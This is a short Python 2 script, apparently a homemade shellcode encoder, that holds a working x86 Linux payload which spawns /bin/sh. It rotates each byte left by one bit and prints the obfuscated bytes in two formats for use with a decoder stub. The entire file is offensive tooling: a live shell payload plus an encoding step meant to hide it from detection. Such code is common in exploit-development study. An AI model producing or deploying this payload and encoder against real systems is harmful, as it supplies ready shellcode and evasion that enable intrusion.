shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

max_bits = 8 
offset = 1

for x in bytearray(shellcode):
    value = x
    newval = rol(value, offset, max_bits)
    #print("\\x%02x" % (value,offset,  newval))
    encoded += '\\x'
    encoded += '%02x' % newval 
    encoded2 += '0x'
    encoded2 += '%02x,' % newval
print encoded
print encoded2
print 'Len: %d' % len(bytearray(shellcode))
